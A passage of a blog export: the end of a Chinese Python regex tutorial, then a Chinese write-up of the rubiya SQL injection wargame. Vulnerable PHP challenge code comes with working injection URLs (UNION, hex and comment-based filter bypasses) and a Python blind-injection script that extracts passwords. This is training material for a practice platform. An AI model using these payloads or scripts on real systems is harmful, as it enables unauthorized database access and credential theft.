class=\"string\">&#x27;group&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>re.split(pattern, string, maxsplit=0, flags=0)</code>：用正则去分割字符串</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.split(<span class=\"string\">&#x27;[a-f]+&#x27;</span>, <span class=\"string\">&#x27;a1b2321c912d9&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s)</span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>, <span class=\"string\">&#x27;2321&#x27;</span>, <span class=\"string\">&#x27;912&#x27;</span>, <span class=\"string\">&#x27;9&#x27;</span>]  <span class=\"comment\"># 如果字符串第一个匹配成功，list第一位为空</span></span><br></pre></td></tr></table></figure>\n\n<p><code>re.findalll(pattern, string, flags=0)</code>：将匹配到的返回一个列表组合</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>s = re.findall(<span class=\"string\">&#x27;abc&#x27;</span>, <span class=\"string\">&quot;abcskodqwabcjiabc&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>print(s)</span><br><span class=\"line\">[<span class=\"string\">&#x27;abc&#x27;</span>, <span class=\"string\">&#x27;abc&#x27;</span>, <span class=\"string\">&#x27;abc&#x27;</span>]</span><br></pre></td></tr></table></figure>\n\n<p><strong>分组</strong></p>\n<p>如果正则中有括号进行分组，可以用group加上编号进行读取</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m = re.match(<span class=\"string\">r&quot;(\\w+) (\\w+)&quot;</span>, <span class=\"string\">&quot;Isaac Newton, physicist&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;Isaac Newton&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;Isaac&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;Newton&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>分组号有名称</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m = re.match(<span class=\"string\">r&quot;(?P&lt;first_name&gt;\\w+) (?P&lt;last_name&gt;\\w+)&quot;</span>, <span class=\"string\">&quot;Malcolm Reynolds&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"string\">&#x27;first_name&#x27;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;Malcolm&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"string\">&#x27;last_name&#x27;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;Reynolds&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><ol>\n<li><a href=\"https://deerchao.cn/tutorials/regex/regex.htm\">https://deerchao.cn/tutorials/regex/regex.htm</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000013075245\">https://segmentfault.com/a/1190000013075245</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000000426455\">https://segmentfault.com/a/1190000000426455</a></li>\n<li><a href=\"https://regexper.com/#\">正则表达式图形化分析工具</a></li>\n</ol>\n","categories":["Program"],"tags":["正则"]},{"title":"rubiya注入题目writeup","url":"http://blog.le31ei.top/2020/11/19/rubiya注入题目writeup/","content":"<p>最近复习注入，便找了许多ctf题目来做，这个题目一共48道注入题，记录一下解题过程。</p>\n<p>平台地址为：<a href=\"https://los.rubiya.kr/\">https://los.rubiya.kr/</a></p>\n<h1 id=\"1-gremlin\"><a href=\"#1-gremlin\" class=\"headerlink\" title=\"1. gremlin\"></a>1. gremlin</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>;</span><br><span class=\"line\">  login_chk();</span><br><span class=\"line\">  $db = dbconnect();</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); <span class=\"comment\">// do not try to attack another table, database!</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>);</span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_gremlin where id=&#x27;<span class=\"subst\">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) solve(<span class=\"string\">&quot;gremlin&quot;</span>);</span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>这道题很简单，最基础的注入。</p>\n<p><code>https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=1%27+or+%271%27--+</code></p>\n<h1 id=\"2-cobolt\"><a href=\"#2-cobolt\" class=\"headerlink\" title=\"2. cobolt\"></a>2. cobolt</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk();</span><br><span class=\"line\">  $db = dbconnect();</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_cobolt where id=&#x27;<span class=\"subst\">&#123;$_GET[id]&#125;</span>&#x27; and pw=md5(&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;)&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;cobolt&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">elseif</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;br&gt;You are not admin :(&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p><code>https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=a%27+union+select+%27admin%27--+</code></p>\n<h1 id=\"3-goblin\"><a href=\"#3-goblin\" class=\"headerlink\" title=\"3. goblin\"></a>3. goblin</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[no])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;|\\&quot;|\\`/i&#x27;</span>, $_GET[no])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Quotes ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_goblin where id=&#x27;guest&#x27; and no=<span class=\"subst\">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;goblin&quot;</span>);</span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了单引号，只需要将no参数转换为16进制即可</p>\n<p><code>https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=-2+union+select+0x61646d696e--+</code></p>\n<h1 id=\"4-orc\"><a href=\"#4-orc\" class=\"headerlink\" title=\"4.orc\"></a>4.orc</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">   </span><br><span class=\"line\">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select pw from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(($result[<span class=\"string\">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class=\"string\">&#x27;pw&#x27;</span>] == $_GET[<span class=\"string\">&#x27;pw&#x27;</span>])) solve(<span class=\"string\">&quot;orc&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>对pw进行了addslashed过滤，无法进行绕过，需要在注入点进行盲注，写了个脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;PHPSESSID&quot;</span>: <span class=\"string\">&quot;xxxx&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&quot;123&#x27;+or+ascii(substr(pw,&#123;&#125;,1))=&#123;&#125;--+&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">temp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">        r = requests.get(<span class=\"string\">&quot;https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=&quot;</span>+payload.<span class=\"built_in\">format</span>(i+<span class=\"number\">1</span>, <span class=\"built_in\">ord</span>(s)), </span><br><span class=\"line\">            cookies=cookie, proxies=&#123;<span class=\"string\">&#x27;https&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class=\"string\">&#x27;http&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class=\"line\">            verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello admin&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            temp = temp+s</span><br><span class=\"line\">            print(temp)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>注入出来pw的值为<code>095a9852</code>，传入该值，即可通关</p>\n<h1 id=\"5-Walfman\"><a href=\"#5-Walfman\" class=\"headerlink\" title=\"5. Walfman\"></a>5. Walfman</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/ /i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No whitespace ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_wolfman where id=&#x27;guest&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;wolfman&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了空格，可以用<code>/**/</code>注释进行绕过</p>\n<p><code>https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=an&#39;/**/union/**/select/**/&#39;admin&#39;%23</code></p>\n<h1 id=\"6-darkelf\"><a href=\"#6-darkelf\" class=\"headerlink\" title=\"6. darkelf\"></a>6. darkelf</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect();  </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/or|and/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_darkelf where id=&#x27;guest&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;darkelf&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了or，and，真不知过滤这个有啥用，可以直接用上一题的payload</p>\n<p>``<a href=\"https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=123&#39;+union+select+&#39;admin&#39;%23%60\">https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=123&#39;+union+select+&#39;admin&#39;%23`</a></p>\n<h1 id=\"7-orge\"><a href=\"#7-orge\" class=\"headerlink\" title=\"7. orge\"></a>7. orge</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/or|and/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_orge where id=&#x27;guest&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">   </span><br><span class=\"line\">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select pw from prob_orge where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(($result[<span class=\"string\">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class=\"string\">&#x27;pw&#x27;</span>] == $_GET[<span class=\"string\">&#x27;pw&#x27;</span>])) solve(<span class=\"string\">&quot;orge&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>跟第四题一样，只是过滤了or，只需要通过<code>||</code>替换or即可，可以用同一个脚本进行注入</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;PHPSESSID&quot;</span>: <span class=\"string\">&quot;&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&quot;123&#x27;+||+ascii(substr(pw,&#123;&#125;,1))=&#123;&#125;--+&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">temp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">        r = requests.get(<span class=\"string\">&quot;https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=&quot;</span>+payload.<span class=\"built_in\">format</span>(i+<span class=\"number\">1</span>, <span class=\"built_in\">ord</span>(s)), </span><br><span class=\"line\">            cookies=cookie, proxies=&#123;<span class=\"string\">&#x27;https&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class=\"string\">&#x27;http&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class=\"line\">            verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span 